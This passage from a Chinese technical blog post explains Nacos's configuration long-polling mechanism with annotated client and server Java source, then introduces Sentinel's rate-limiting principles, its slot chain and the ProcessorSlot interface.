* <span class=\"doctag\">@throws</span> Exception Exception.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">List&lt;String&gt; <span class=\"title function_\">checkUpdateDataIds</span><span class=\"params\">(List&lt;CacheData&gt; cacheDatas, List&lt;String&gt; inInitializingCacheList)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 拼接出配置文件的唯一标识</span></span><br><span class=\"line\">    <span class=\"type\">StringBuilder</span> <span class=\"variable\">sb</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class=\"line\">            sb.append(cacheData.dataId).append(WORD_SEPARATOR);</span><br><span class=\"line\">            sb.append(cacheData.group).append(WORD_SEPARATOR);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (StringUtils.isBlank(cacheData.tenant)) &#123;</span><br><span class=\"line\">                sb.append(cacheData.getMd5()).append(LINE_SEPARATOR);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                sb.append(cacheData.getMd5()).append(WORD_SEPARATOR);</span><br><span class=\"line\">                sb.append(cacheData.getTenant()).append(LINE_SEPARATOR);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (cacheData.isInitializing()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// It updates when cacheData occours in cacheMap by first time.</span></span><br><span class=\"line\">                inInitializingCacheList</span><br><span class=\"line\">                        .add(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">isInitializingCacheList</span> <span class=\"operator\">=</span> !inInitializingCacheList.isEmpty();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> checkUpdateConfigStr(sb.toString(), isInitializingCacheList);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Fetch the updated dataId list from server.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> probeUpdateString       updated attribute string value.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> isInitializingCacheList initial cache lists.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> The updated dataId list(ps: it maybe null).</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@throws</span> IOException Exception.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">List&lt;String&gt; <span class=\"title function_\">checkUpdateConfigStr</span><span class=\"params\">(String probeUpdateString, <span class=\"type\">boolean</span> isInitializingCacheList)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    Map&lt;String, String&gt; params = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, String&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">    params.put(Constants.PROBE_MODIFY_REQUEST, probeUpdateString);</span><br><span class=\"line\">    Map&lt;String, String&gt; headers = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;String, String&gt;(<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 长轮询的超时时间</span></span><br><span class=\"line\">    headers.put(<span class=\"string\">&quot;Long-Pulling-Timeout&quot;</span>, <span class=\"string\">&quot;&quot;</span> + timeout);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// told server do not hang me up if new initializing cacheData added in</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isInitializingCacheList) &#123;</span><br><span class=\"line\">        headers.put(<span class=\"string\">&quot;Long-Pulling-Timeout-No-Hangup&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (StringUtils.isBlank(probeUpdateString)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// In order to prevent the server from handling the delay of the client&#x27;s long task,</span></span><br><span class=\"line\">        <span class=\"comment\">// increase the client&#x27;s read timeout to avoid this problem.</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">readTimeoutMs</span> <span class=\"operator\">=</span> timeout + (<span class=\"type\">long</span>) Math.round(timeout &gt;&gt; <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 向服务端发起一个http请求，该请求在服务端配置没有变更的情况下默认会hang住30s</span></span><br><span class=\"line\">        HttpRestResult&lt;String&gt; result = agent</span><br><span class=\"line\">                .httpPost(Constants.CONFIG_CONTROLLER_PATH + <span class=\"string\">&quot;/listener&quot;</span>, headers, params, agent.getEncode(),</span><br><span class=\"line\">                        readTimeoutMs);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (result.ok()) &#123;</span><br><span class=\"line\">            setHealthServer(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"comment\">// 响应状态是成功则解析响应体得到 dataId、group、tenant 等信息并返回</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> parseUpdateDataIdResponse(result.getData());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            setHealthServer(<span class=\"literal\">false</span>);</span><br><span class=\"line\">            LOGGER.error(<span class=\"string\">&quot;[&#123;&#125;] [check-update] get changed dataId error, code: &#123;&#125;&quot;</span>, agent.getName(),</span><br><span class=\"line\">                    result.getCode());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">        setHealthServer(<span class=\"literal\">false</span>);</span><br><span class=\"line\">        LOGGER.error(<span class=\"string\">&quot;[&quot;</span> + agent.getName() + <span class=\"string\">&quot;] [check-update] get changed dataId exception&quot;</span>, e);</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> e;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Collections.emptyList();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端对 listener 接口的请求会进入到服务端的 com.alibaba.nacos.config.server.controller.ConfigController#listener 方法进行处理，该方法主要是调用了 com.alibaba.nacos.config.server.controller.ConfigServletInner#doPollingConfig 方法。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 轮询接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">doPollingConfig</span><span class=\"params\">(HttpServletRequest request, HttpServletResponse response,</span></span><br><span class=\"line\"><span class=\"params\">                              Map&lt;String, String&gt; clientMd5Map, <span class=\"type\">int</span> probeRequestSize)</span></span><br><span class=\"line\">    <span class=\"keyword\">throws</span> IOException, ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果支持长轮询则进入长轮询的流程</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (LongPollingService.isSupportLongPolling(request)) &#123;</span><br><span class=\"line\">        longPollingService.addLongPollingClient(request, response, clientMd5Map, probeRequestSize);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> HttpServletResponse.SC_OK + <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// else 兼容短轮询逻辑</span></span><br><span class=\"line\">    List&lt;String&gt; changedGroups = MD5Util.compareMd5(request, response, clientMd5Map);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 兼容短轮询result</span></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">oldResult</span> <span class=\"operator\">=</span> MD5Util.compareMd5OldResult(changedGroups);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">newResult</span> <span class=\"operator\">=</span> MD5Util.compareMd5ResultString(changedGroups);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">version</span> <span class=\"operator\">=</span> request.getHeader(Constants.CLIENT_VERSION_HEADER);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (version == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        version = <span class=\"string\">&quot;2.0.0&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">versionNum</span> <span class=\"operator\">=</span> Protocol.getVersionNumber(version);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 2.0.4版本以前, 返回值放入header中</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (versionNum &lt; START_LONGPOLLING_VERSION_NUM) &#123;</span><br><span class=\"line\">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE, oldResult);</span><br><span class=\"line\">        response.addHeader(Constants.PROBE_MODIFY_RESPONSE_NEW, newResult);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        request.setAttribute(<span class=\"string\">&quot;content&quot;</span>, newResult);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 禁用缓存</span></span><br><span class=\"line\">    response.setHeader(<span class=\"string\">&quot;Pragma&quot;</span>, <span class=\"string\">&quot;no-cache&quot;</span>);</span><br><span class=\"line\">    response.setDateHeader(<span class=\"string\">&quot;Expires&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    response.setHeader(<span class=\"string\">&quot;Cache-Control&quot;</span>, <span class=\"string\">&quot;no-cache,no-store&quot;</span>);</span><br><span class=\"line\">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> HttpServletResponse.SC_OK + <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们主要关注上面的 com.alibaba.nacos.config.server.service.LongPollingService#addLongPollingClient 长轮询流程的方法。代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addLongPollingClient</span><span class=\"params\">(HttpServletRequest req, HttpServletResponse rsp, Map&lt;String, String&gt; clientMd5Map,</span></span><br><span class=\"line\"><span class=\"params\">                                 <span class=\"type\">int</span> probeRequestSize)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> req.getHeader(LongPollingService.LONG_POLLING_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">noHangUpFlag</span> <span class=\"operator\">=</span> req.getHeader(LongPollingService.LONG_POLLING_NO_HANG_UP_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">appName</span> <span class=\"operator\">=</span> req.getHeader(RequestUtil.CLIENT_APPNAME_HEADER);</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">tag</span> <span class=\"operator\">=</span> req.getHeader(<span class=\"string\">&quot;Vipserver-Tag&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">delayTime</span> <span class=\"operator\">=</span> SwitchService.getSwitchInteger(SwitchService.FIXED_DELAY_TIME, <span class=\"number\">500</span>);</span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提前500ms返回响应，为避免客户端超时 <span class=\"doctag\">@qiaoyi</span>.dingqy 2013.10.22改动  add delay time for LoadBalance</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">timeout</span> <span class=\"operator\">=</span> Math.max(<span class=\"number\">10000</span>, Long.parseLong(str) - delayTime);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isFixedPolling()) &#123;</span><br><span class=\"line\">        timeout = Math.max(<span class=\"number\">10000</span>, getFixedPollingInterval());</span><br><span class=\"line\">        <span class=\"comment\">// do nothing but set fix polling timeout</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">start</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">        List&lt;String&gt; changedGroups = MD5Util.compareMd5(req, rsp, clientMd5Map);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (changedGroups.size() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            generateResponse(req, rsp, changedGroups);</span><br><span class=\"line\">            LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                System.currentTimeMillis() - start, <span class=\"string\">&quot;instant&quot;</span>, RequestUtil.getRemoteIp(req), <span class=\"string\">&quot;polling&quot;</span>,</span><br><span class=\"line\">                clientMd5Map.size(), probeRequestSize, changedGroups.size());</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (noHangUpFlag != <span class=\"literal\">null</span> &amp;&amp; noHangUpFlag.equalsIgnoreCase(TRUE_STR)) &#123;</span><br><span class=\"line\">            LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>, System.currentTimeMillis() - start, <span class=\"string\">&quot;nohangup&quot;</span>,</span><br><span class=\"line\">                RequestUtil.getRemoteIp(req), <span class=\"string\">&quot;polling&quot;</span>, clientMd5Map.size(), probeRequestSize,</span><br><span class=\"line\">                changedGroups.size());</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">String</span> <span class=\"variable\">ip</span> <span class=\"operator\">=</span> RequestUtil.getRemoteIp(req);</span><br><span class=\"line\">    <span class=\"comment\">// 一定要由HTTP线程调用，否则离开后容器会立即发送响应</span></span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">AsyncContext</span> <span class=\"variable\">asyncContext</span> <span class=\"operator\">=</span> req.startAsync();</span><br><span class=\"line\">    <span class=\"comment\">// AsyncContext.setTimeout()的超时时间不准，所以只能自己控制</span></span><br><span class=\"line\">    asyncContext.setTimeout(<span class=\"number\">0L</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 在 ClientLongPolling 的 run 方法会将 ClientLongPolling 实例（携带了本次请求的相关信息）放入 allSubs 中，然后会在29.5s后再执行另一个 Runnable，该 Runnable 用于等待29.5s后依旧没有相应的配置变更时对客户端进行响应，并将相应的 ClientLongPolling 实例从 allSubs 中移出</span></span><br><span class=\"line\">    scheduler.execute(</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">ClientLongPolling</span>(asyncContext, clientMd5Map, ip, probeRequestSize, timeout, appName, tag));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>而 LongPollingService 实现了 AbstractEventListener，也就是说能接收事件通知，在其 com.alibaba.nacos.config.server.service.LongPollingService#onEvent 方法中可以看到，它关注的是 LocalDataChangeEvent 事件：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onEvent</span><span class=\"params\">(Event event)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (isFixedPolling()) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// ignore</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (event <span class=\"keyword\">instanceof</span> LocalDataChangeEvent) &#123;</span><br><span class=\"line\">            <span class=\"type\">LocalDataChangeEvent</span> <span class=\"variable\">evt</span> <span class=\"operator\">=</span> (LocalDataChangeEvent)event;</span><br><span class=\"line\">            scheduler.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">DataChangeTask</span>(evt.groupKey, evt.isBeta, evt.betaIps));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在nacos上修改配置后就会产生 LocalDataChangeEvent 事件，此时 LongPollingService 也就能监听到，当收到该事件时就会遍历 allSubs，找到匹配的请求并将 groupKey 返回给客户端。具体代码在 DataChangeTask 中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DataChangeTask</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            ConfigService.getContentBetaMd5(groupKey);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (Iterator&lt;ClientLongPolling&gt; iter = allSubs.iterator(); iter.hasNext(); ) &#123;</span><br><span class=\"line\">                <span class=\"type\">ClientLongPolling</span> <span class=\"variable\">clientSub</span> <span class=\"operator\">=</span> iter.next();</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (clientSub.clientMd5Map.containsKey(groupKey)) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">// 如果beta发布且不在beta列表直接跳过</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (isBeta &amp;&amp; !betaIps.contains(clientSub.ip)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// 如果tag发布且不在tag列表直接跳过</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (StringUtils.isNotBlank(tag) &amp;&amp; !tag.equals(clientSub.tag)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    getRetainIps().put(clientSub.ip, System.currentTimeMillis());</span><br><span class=\"line\">                    iter.remove(); <span class=\"comment\">// 删除订阅关系</span></span><br><span class=\"line\">                    LogUtil.clientLog.info(<span class=\"string\">&quot;&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;|&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                        (System.currentTimeMillis() - changeTime),</span><br><span class=\"line\">                        <span class=\"string\">&quot;in-advance&quot;</span>,</span><br><span class=\"line\">                        RequestUtil.getRemoteIp((HttpServletRequest)clientSub.asyncContext.getRequest()),</span><br><span class=\"line\">                        <span class=\"string\">&quot;polling&quot;</span>,</span><br><span class=\"line\">                        clientSub.clientMd5Map.size(), clientSub.probeRequestSize, groupKey);</span><br><span class=\"line\">                    clientSub.sendResponse(Arrays.asList(groupKey));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable t) &#123;</span><br><span class=\"line\">            LogUtil.defaultLog.error(<span class=\"string\">&quot;data change error:&quot;</span> + t.getMessage(), t.getCause());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(groupKey, <span class=\"literal\">false</span>, <span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey, <span class=\"type\">boolean</span> isBeta, List&lt;String&gt; betaIps) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>(groupKey, isBeta, betaIps, <span class=\"literal\">null</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    DataChangeTask(String groupKey, <span class=\"type\">boolean</span> isBeta, List&lt;String&gt; betaIps, String tag) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.groupKey = groupKey;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.isBeta = isBeta;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.betaIps = betaIps;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.tag = tag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">final</span> String groupKey;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">long</span> <span class=\"variable\">changeTime</span> <span class=\"operator\">=</span> System.currentTimeMillis();</span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> isBeta;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> List&lt;String&gt; betaIps;</span><br><span class=\"line\">    <span class=\"keyword\">final</span> String tag;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当客户端收到变更的dataid+group后，就会去服务端获取最新的配置数据，并更新本地数据 cacheData，然后发送数据变更事件，整个流程结束。</p>\n<ul>\n<li>获取服务端最新配置数据的方法：com.alibaba.nacos.client.config.impl.ClientWorker#getServerConfig</li>\n<li>发送数据变更事件的方法：com.alibaba.nacos.client.config.impl.CacheData#checkListenerMd5</li>\n</ul>\n<h2 id=\"Sentienl\"><a href=\"#Sentienl\" class=\"headerlink\" title=\"Sentienl\"></a>Sentienl</h2><p>Sentinel是阿里巴巴开源的一款流量控制和熔断降级框架，主要用于微服务架构中服务的流量控制和熔断降级。其限流实现原理主要分为两个部分：</p>\n<blockquote>\n<p>统计信息收集</p>\n</blockquote>\n<p>Sentinel会在运行过程中对服务的各种统计信息进行收集，包括请求的响应时间、请求通过的QPS（每秒查询率）、线程池队列大小等指标。这些指标通过定义的规则进行分析，判断当前请求是否超过了设定的阈值。</p>\n<blockquote>\n<p>阈值判断</p>\n</blockquote>\n<p>Sentinel根据收集到的统计信息，通过定义的规则对请求进行判断。规则中包括以下几个要素：</p>\n<p>资源名：对哪个资源进行限流<br>流控模式：直接拒绝或者匀速通过<br>流控阈值：单位时间内允许通过的请求个数<br>统计时间窗口：多长时间内统计一次流量，单位秒<br>降级处理：当请求超过阈值时的处理策略，如直接拒绝、返回默认值等<br>Sentinel会根据以上规则进行限流，当请求超过阈值时，根据设置的降级处理策略进行处理，比如直接拒绝请求、返回默认值等。同时，Sentinel还可以进行自适应的流控，根据实际情况调整阈值，保证服务的可用性和稳定性。</p>\n<h3 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h3><h4 id=\"Slot-插槽\"><a href=\"#Slot-插槽\" class=\"headerlink\" title=\"Slot 插槽\"></a>Slot 插槽</h4><p>在 Sentinel 里面，所有的资源都对应一个资源名称（resourceName），每次资源调用都会创建一个 Entry 对象。Entry 可以通过对主流框架的适配自动创建，也可以通过注解的方式或调用 SphU API 显式创建。Entry 创建的时候，同时也会创建一系列功能插槽（slot chain），这些插槽有不同的职责，例如:</p>\n<ul>\n<li>NodeSelectorSlot 负责收集资源的路径，并将这些资源的调用路径，以树状结构存储起来，用于根据调用路径来限流降级；</li>\n<li>ClusterBuilderSlot 则用于存储资源的统计信息以及调用者信息，例如该资源的 RT, QPS, thread count 等等，这些信息将用作为多维度限流，降级的依据；</li>\n<li>StatisticSlot 则用于记录、统计不同纬度的 runtime 指标监控信息；</li>\n<li>FlowSlot 则用于根据预设的限流规则以及前面 slot 统计的状态，来进行流量控制；</li>\n<li>AuthoritySlot 则根据配置的黑白名单和调用来源信息，来做黑白名单控制；</li>\n<li>DegradeSlot 则通过统计信息以及预设的规则，来做熔断降级；</li>\n<li>SystemSlot 则通过系统的状态，例如 load1 等，来控制总的入口流量；</li>\n</ul>\n<p>Sentinel 提供了插槽接口 ProcessorSlot，其中提供了方法 enrty 处理进入请求 和 exit 处理请求结束操作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">interface</span> <span class=\"title class_\">ProcessorSlot</span>&lt;T&gt; &#123;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Entrance of this slot.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> param           generics parameter, usually is a &#123;<span class=\"doctag\">@link</span> com.alibaba.csp.sentinel.node.Node&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">entry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, T param, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized,</span></span><br><span class=\"line\"><span class=\"params\">               Object... args)</span> <span class=\"keyword\">throws</span> Throwable;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Means finish of &#123;<span class=\"doctag\">@link</span> #entry(Context, ResourceWrapper, Object, int, boolean, Object...)&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> obj             relevant object (e.g. Node)</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> prioritized     whether the entry is prioritized</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@throws</span> Throwable blocked exception or unexpected error</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">fireEntry</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, Object obj, <span class=\"type\">int</span> count, <span class=\"type\">boolean</span> prioritized,</span></span><br><span class=\"line\"><span class=\"params\">                   Object... args)</span> <span class=\"keyword\">throws</span> Throwable;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Exit of this slot.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> context         current &#123;<span class=\"doctag\">@link</span> Context&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> resourceWrapper current resource</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> count           tokens needed</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> args            parameters of the original call</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">exit</span><span class=\"params\">(Context context, ResourceWrapper resourceWrapper, <span class=\"type\">int</span> count, Object... args)</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * Means finish of &#123;<span class=\"doctag\">@link</span> #exit(Context, ResourceWrapper, int, Object...)&#125;.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span 